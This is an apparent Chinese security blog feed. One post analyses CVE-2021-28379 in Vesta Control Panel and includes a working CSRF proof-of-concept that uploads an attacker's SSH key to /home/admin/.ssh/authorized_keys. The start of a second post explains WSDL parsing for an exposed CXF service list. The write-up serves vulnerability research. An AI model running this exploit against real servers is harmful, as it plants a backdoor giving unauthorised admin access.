    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Vesta Control Panel（VestaCP）是一个开源的虚拟主机控制面板。 Vesta Control Panel 0.9.8-27 版本及之前版本存在代码问题漏洞，该漏洞源于<code>/web/upload/UploadHandler.php</code>可配合 CSRF 漏洞在管理员主页中创建<code>.ssh</code>文件夹并上传<code>authorized_keys</code>文件，最终可以通过 ssh 以 admin 身份访问服务器。</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p>定位漏洞文件<code>/web/upload/index.php</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490838670-dec02324-6c35-4c02-9732-ca07d4c6c511.png#clientId=uba2e81e3-384f-4&from=paste&height=81&id=u1ad1ca6d&margin=%5Bobject%20Object%5D&originHeight=81&originWidth=407&originalType=url&status=done&style=none&taskId=u36e5de5c-c0ae-4dc2-9555-06a18741e33&width=407" srcset="/img/loading.gif" lazyload alt=""><br>该文件创建 UploadHandler 类的一个实例，相应上传操作在 UploadHandler.php 中实现。再定位到 UploadHandler.php，可以看到如下构造方法<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490838835-0cff0558-d7d5-4ff6-b01d-3f24e74c0bd8.png#clientId=uba2e81e3-384f-4&from=paste&height=187&id=u01ee5ab5&margin=%5Bobject%20Object%5D&originHeight=227&originWidth=909&originalType=url&status=done&style=none&taskId=u90c0903f-0426-4dcc-aa22-43a293ede1d&width=750.5" srcset="/img/loading.gif" lazyload alt=""><br>accept_file_types 接受任意类型，此时首先应想到上传 php 来 getshell。但<code>/files/</code>目录并不能解析 php 文件，遂继续阅读代码看能否跨目录上传到 web 目录。继续跟到上传功能函数<code>handle_file_upload()</code>部分<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490838725-dffb89d5-a491-4fdc-b814-c66f32ec7376.png#clientId=uba2e81e3-384f-4&from=paste&height=315&id=u1efd9efa&margin=%5Bobject%20Object%5D&originHeight=446&originWidth=1098&originalType=url&status=done&style=none&taskId=u7df71704-018c-45e1-b3c8-0b5adff61c6&width=776" srcset="/img/loading.gif" lazyload alt=""><br>该函数首先会调用<code>trim_file_name()</code>来对文件名进行修改，我们来看下他干了什么<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490838703-bca1b1ce-637a-4374-bc51-cdcdad3cfd4b.png#clientId=uba2e81e3-384f-4&from=paste&height=174&id=u91bb2a4b&margin=%5Bobject%20Object%5D&originHeight=291&originWidth=808&originalType=url&status=done&style=none&taskId=u79e182b9-6970-45f8-bcd9-fef556977ba&width=482" srcset="/img/loading.gif" lazyload alt=""></p><ol><li>首先调用 stripslashes()从文件名中删除所有斜杠。</li><li>basename 只取出文件名，保证不包含任何路径</li><li>从文件名的开头和结尾删除所有控制字符（0x00 - 0x20)。</li></ol><p>完美打破了我们在文件名上尝试目录穿越上传 webshell 的想法。问题不大继续往下看，在图三中 handle_file_upload 最后几行获取上传目录，该目录就是文件将被上载到的目录，如果该目录不存在，<strong>则会创建</strong>该目录。继续跟到 get_upload_path 函数<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490838976-954b75f0-761f-4cdd-8206-d5426fc0feeb.png#clientId=uba2e81e3-384f-4&from=paste&height=347&id=u1241b4e1&margin=%5Bobject%20Object%5D&originHeight=554&originWidth=866&originalType=url&status=done&style=none&taskId=u848ae959-bb22-406a-91e5-fd2bbbaec9a&width=542" srcset="/img/loading.gif" lazyload alt=""><br>我们可以 get 方式传递 dir 参数并将上传目录设置为任何目录，那现在我们是不就可以向 web 目录上传文件了呢。回到 handle_file_upload 中可以看到实际创建文件操作是由<code>v-copy-fs-file</code>脚本完成<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490839746-ac60268e-8916-42cf-9125-b2f30d38c653.png#clientId=uba2e81e3-384f-4&from=paste&height=136&id=u8c7642ee&margin=%5Bobject%20Object%5D&originHeight=271&originWidth=1117&originalType=url&status=done&style=none&taskId=uf635bedc-0a87-4449-889d-f6ebd914fbe&width=558.5" srcset="/img/loading.gif" lazyload alt=""><br>该 bash 脚本位于/bin/目录下，找到对<code>$file_path</code>做检查操作的相关行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490840512-eb43b708-45e7-462b-a22d-c1782cc97eab.png#clientId=uba2e81e3-384f-4&from=paste&height=485&id=u6f62a1c2&margin=%5Bobject%20Object%5D&originHeight=828&originWidth=1136&originalType=url&status=done&style=none&taskId=ucd8173de-e3e5-4f5b-94d0-fd00a309a20&width=666" srcset="/img/loading.gif" lazyload alt=""><br>允许并仅允许写入文件到<code>/tmp/</code>或者<code>/home/admin/</code>目录下<br>回过头撸一下，首先我们可以上传任意文件，其次我们可以控制写入文件路径为<code>/tmp/</code>,<code>/home/admin/</code>或其子目录，再然后 VestaCP 通常安装在 linux 上默认支持 openssh。此时可以想到向<code>/home/admin/.ssh/</code>下写 ssh 公钥，之后通过 ssh 连接到服务器。但 upload/存在鉴权，需登录后才可访问。<br>结合 CSRF 构造 POC 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="actionscript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="actionscript">        <span class="hljs-keyword">var</span> mystring =</span><br><span class="actionscript">          <span class="hljs-string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDY463UG77/acyToxaVO3EbPlpzKCRLNHtWye7a0zLYYBw5Ylncktc7xo+xytuJpqdXxyMOJAtrMhSuEG/8tXtVRf317rPxn4CFd6cP6OZC36crzTdsZQzHIxBdogeHHdbluDOS+JD1MjEZU2pXg/A01jJJ2IQ6DHjkNeDhFH2/RChCiWEgGRDOgImg5EU0ScnBacJwXsoikxQgI/s/2RdKs5M9IOr2YclsTugPUnnGzMHPLyG3RNfS5MC/QyVTyGG1IInLttqhwYGpXBhAXZsahUyQd03PwgvMO3EhK6zBvgIGLFybSwVogDPgACT4/O6Je3ynMCUSexSuNkFPgvnh root@iZbp19ryeo1038lmdsso1pZ"</span>;</span><br><span class="actionscript">        <span class="hljs-keyword">var</span> fileContent = <span class="hljs-keyword">new</span> Blob([mystring], &#123;</span><br><span class="actionscript">          type: <span class="hljs-string">"text/plain"</span>,</span><br>        &#125;);<br><span class="actionscript">        myFormData = <span class="hljs-keyword">new</span> FormData();</span><br><span class="actionscript">        myFormData.append(<span class="hljs-string">"files"</span>, fileContent, <span class="hljs-string">"authorized_keys"</span>);</span><br><span class="actionscript">        fetch(<span class="hljs-string">"https://localhost:8083/upload/index.php?dir=/home/admin/.ssh/"</span>, &#123;</span><br><span class="actionscript">          method: <span class="hljs-string">"post"</span>,</span><br>          body: myFormData,<br><span class="actionscript">          credentials: <span class="hljs-string">"include"</span>,</span><br>        &#125;);<br>      &#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"exploit();"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>傻瓜式环境搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Connect to your server as root via SSH</span><br>ssh root@your.server<br><span class="hljs-comment"># Download installation script</span><br>curl -O http://vestacp.com/pub/vst-install.sh<br><span class="hljs-comment"># Run it</span><br>bash vst-install.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490840144-18b8127f-b84c-45e9-a181-940f087c54b1.png#clientId=uba2e81e3-384f-4&from=paste&height=380&id=u1db9b6a0&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=380&originalType=url&status=done&style=none&taskId=ud69dc2e3-6749-4866-ac68-d3bbcb5836d&width=380" srcset="/img/loading.gif" lazyload alt=""><br>将 POC 写入 exploit.html<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490840225-2a27819b-2b69-46fa-bfe3-a111231fed6d.png#clientId=uba2e81e3-384f-4&from=paste&height=190&id=u97c10e00&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=380&originalType=url&status=done&style=none&taskId=uc3dce5e2-ee5a-4e7c-ac2b-990f3a29fe7&width=190" srcset="/img/loading.gif" lazyload alt=""><br>登录状态点击<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490840554-09581f11-8f89-46e6-995e-32002db31dda.png#clientId=uba2e81e3-384f-4&from=paste&height=380&id=u4747ea9c&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=380&originalType=url&status=done&style=none&taskId=u32f2d752-29a5-4d29-b299-388c25d76a0&width=380" srcset="/img/loading.gif" lazyload alt=""><br>ssh -i id_rsa admin@target<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618490840604-fc4ed436-196e-4821-94f0-a8a6d2ea600e.png#clientId=uba2e81e3-384f-4&from=paste&height=380&id=u3bbb0878&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=380&originalType=url&status=done&style=none&taskId=u530e4164-0b6c-47cf-886f-cdd927b752d&width=380" srcset="/img/loading.gif" lazyload alt=""></p><h1 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h1><p>[1] <a href="https://blog.fadyothman.com/cve-2021-28379-gaining-rce-via-ssh-backdoor-in-vestacp" target="_blank" rel="noopener">https://blog.fadyothman.com/cve-2021-28379-gaining-rce-via-ssh-backdoor-in-vestacp/</a><br>[2] <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-28379" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2021-28379</a><br>[3] <a href="https://cxsecurity.com/issue/WLB-2021030100" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2021030100</a><br>[4] <a href="https://github.com/serghey-rodin/vesta/tree/0.9.8-24" target="_blank" rel="noopener">https://github.com/serghey-rodin/vesta/tree/0.9.8-24</a><br>[5] <a href="https://vestacp.com/install" target="_blank" rel="noopener">https://vestacp.com/install/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CXF服务列表暴露引发的安全问题</title>
    <link href="/posts/1003/"/>
    <url>/posts/1003/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好大哥无聊在逛网站的时候意外发现了某厂商的 Server list，此服务文档中记录大量的 services。测试结果也不出所料发现了 N+1 的 SQL 注入、HQL 注入、未授权访问及 xxe 等漏洞打包。提交 SRC 之后也是拿到了不错的赏金，就决定写（shui）篇文章记录以下，同时学习一下关于 WebService 和接口安全的知识。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Web-Service-简介"><a href="#Web-Service-简介" class="headerlink" title="Web Service 简介"></a>Web Service 简介</h2><p>Web Service 是一种跨语言和跨平台的<strong>远程调用(RPC)技术</strong>[使用网络调用其他网站资源]<br>主要分为两种：<br>一、SOAP 型 WebService</p><blockquote><p>SOAP（Simple Object Access Protocol，简单对象访问协议）使用 WSDL 描述服务，用于在 Web Service 中把远程调用和返回封装成机器可读的 XML 数据，定义了传输消息的规则或标准（在这个规则下发送方和接受方都能清楚的知道对方所要表达的意思）</p></blockquote><p>二、REST 型 WebService</p><blockquote><p>REST (REpresentational State Transfort，表征性状态转移)  是 SOAP 的优化版，但他并不是一种协而是一种架构风格。它简化了服务的请求方法 大体与 http 一致即远程调用请求时不需再对数据进行封装，由 URL 决定资源，HTTP Method（GET POST PUT DELETE）决定操作。响应返回消息可以支持多种数据格式如 JSON、CSV、RSS。客户端可以选择自己易于解析的格式获得输出消息</p></blockquote><p>WSDL（Web Services Description Language, 网络服务描述语言）</p><blockquote><p>WSDL 是一种 XML 语言，用于正式描述 Web service。考虑 Web 服务的 WSDL 描述及其与客户端的 API 契约。WSDL 描述指定了 Web Service 的地址，允许的通信机制，接口和消息类型。简而言之，WSDL 描述提供了客户端使用 Web 服务所需的所有信息。他定义了一个服务的具体接口文档，相当于一个详细的使用手册。<br>有了 WSDL 之后，使用 Web Service 的过程就变为获得该服务的 WSDL 描述，根据 WSDL 构造一条格式化的 SOAP 请求发送给服务器，然后接收一条同样 SOAP 格式的应答，最后根据先前的 WSDL 解析数据。</p></blockquote><p>WADL（Web Application Description Language，网络应用描述语言）</p><blockquote><p>WADL 像是 WSDL 的 REST 版，用来描述 REST 接口。</p></blockquote><p>因为 WADL 的解析比较简单，由 base+path 定位资源路径，method 定义请求方法，request 元素中 param name 定义请求参数名和参数类型。需要注意的是 RESTful 型接口 GET 传单参直接用“/”拼接到资源路径后边而不用“?”，对于多参数一般用 post。这里给一张图帮助理解，后续不再过多介绍<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122130214.png#height=614&id=e2Hz3&originHeight=614&originWidth=1267&originalType=binary&status=done&style=none&width=1267" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="WSDL-基本结构及解析"><a href="#WSDL-基本结构及解析" class="headerlink" title="WSDL 基本结构及解析"></a>WSDL 基本结构及解析</h2><p>一个 WSDL 文档通常包含有以下元素 definitions、types、message、portType、binding、service 元素。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">definitions - WSDL文档的根元素，用来提供命名空间<br>types       - 数据类型(标签)定义的容器，里面使用schema定义了一些标签结构供message引用<br>message     - 通信消息的数据结构的抽象类型化定义。引用types中定义的标签<br>operation   - 对服务中所支持的操作的抽象描述，一个operation描述了一个访问入口的请求消息与响应消息对。<br>portType    - 对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持。<br>binding     - 特定端口类型的具体协议和数据格式规范的绑定。<br>service     - 相关服务访问点的集合<br>port        - 定义为协议/数据格式绑定与具体Web访问地址组合的单个服务访问点。<br></code></pre></td></tr></table></figure><p>以一个挖 SRC 进行信息收集时在某 HUB 发现的 SOAP Service 资产说明如何解析 WSDL<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122130338.png#height=529&id=od9C7&originHeight=529&originWidth=1049&originalType=binary&status=done&style=none&width=1049" srcset="/img/loading.gif" lazyload alt=""><br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122205912.png#height=151&id=LQfx3&margin=%5Bobject%20Object%5D&name=&originHeight=151&originWidth=1620&originalType=binary&status=done&style=none&width=1620" srcset="/img/loading.gif" lazyload alt=""><br>服务列表描述了 CheckIdentityService 模块中的一个操作<br>访问其 WSDL 文档<a href="http://osms.xxx.com/osms/services/checkIdentityService?wsdl" target="_blank" rel="noopener">http://osms.xxx.com/osms/services/checkIdentityService?wsdl</a><br>给出了这个模块的 binding 和 service 元素，具体定义了 Web 服务实现使用的 Internet 协议、编码方案以及 Internet 地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version='1.0' encoding='UTF-8' ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">wsdl:definitions</span> <span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> <span class="hljs-attr">xmlns:wsdl</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/"</span> <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://impl.server.order.services.wbs.osms.xx.com/"</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> <span class="hljs-attr">xmlns:ns2</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/http"</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.xx.com/"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityServiceImplService"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://impl.server.order.services.wbs.osms.xx.com/"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:import</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"http://osms.xxx.com/osms/services/checkIdentityService?wsdl=CheckIdentityService.wsdl"</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.xx.com/"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:import</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:binding</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityServiceImplServiceSoapBinding"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ns1:CheckIdentityService"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">soap:binding</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span> <span class="hljs-attr">transport</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/http"</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">""</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentityResponse"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:binding</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityServiceImplService"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:port</span> <span class="hljs-attr">binding</span>=<span class="hljs-string">"tns:CheckIdentityServiceImplServiceSoapBinding"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityServiceImplPort"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">soap:address</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"http://osms.xxx.com/osms/services/checkIdentityService"</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:port</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:service</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:definitions</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122211002.png#height=191&id=MRKPy&margin=%5Bobject%20Object%5D&name=&originHeight=191&originWidth=1798&originalType=binary&status=done&style=none&width=1798" srcset="/img/loading.gif" lazyload alt=""><br>在 WSDL 文档的第三行导入了外部文档，使得整个 WSDL 文档元素完整起来。不直接将文档的每个元素写到一起而用这种导入的方法是工程模块化导致的结果<br>扯（ke）点（pu）题（yi）外（xia）话，绝对不是为了凑字数，真的！！！</p><blockquote><p>模块化的优点： 1.便于多人协作开发，每个部分开发不会干扰其它地方 2.便于调试修改，因为模块独立，发现问题比较容易，修改一处，也不影响别处，利于前端性能优化 3.利于代码复用，小块的代码可以更方便拿到别的项目中不加或者稍加修改使用，提高可维护性 4.便于功能的扩充，因为软件各个部分是独立的，不需要理解整个软件就可以添加功能，特别适合二次开发。 5.解决了部分恼人的命名冲突以及烦琐的文件依赖<br>缺点： 1.系统分层，调用链会很长 2.模块间通信,模块间发送消息会很耗性能</p></blockquote><p>以下为 import 引入的外部文档<br><a href="http://osms.xxx.com/osms/services/checkIdentityService?wsdl=checkIdentityService" target="_blank" rel="noopener">http://osms.xxx.com/osms/services/checkIdentityService?wsdl=checkIdentityService</a><br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122211239.png#height=324&id=lPtjC&margin=%5Bobject%20Object%5D&name=&originHeight=324&originWidth=1572&originalType=binary&status=done&style=none&width=1572" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version='1.0' encoding='UTF-8' ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">wsdl:definitions</span> <span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> <span class="hljs-attr">xmlns:wsdl</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/"</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.sf.com/"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityService"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.xx.com/"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:types</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xs:schema</span> <span class="hljs-attr">xmlns:xs</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.xx.com/"</span> <span class="hljs-attr">elementFormDefault</span>=<span class="hljs-string">"unqualified"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://server.order.services.wbs.osms.xx.com/"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"tns:checkIdentity"</span> /&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentityResponse"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"tns:checkIdentityResponse"</span> /&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">xs:sequence</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"arg0"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"xs:string"</span> /&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"arg1"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"xs:string"</span> /&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"arg2"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"xs:string"</span> /&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">xs:sequence</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">xs:complexType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentityResponse"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">xs:sequence</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">xs:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Return"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"xs:string"</span> /&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">xs:sequence</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">xs:complexType</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">xs:schema</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:types</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentityResponse"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"ns1:checkIdentityResponse"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:part</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"ns1:checkIdentity"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:part</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:portType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CheckIdentityService"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span 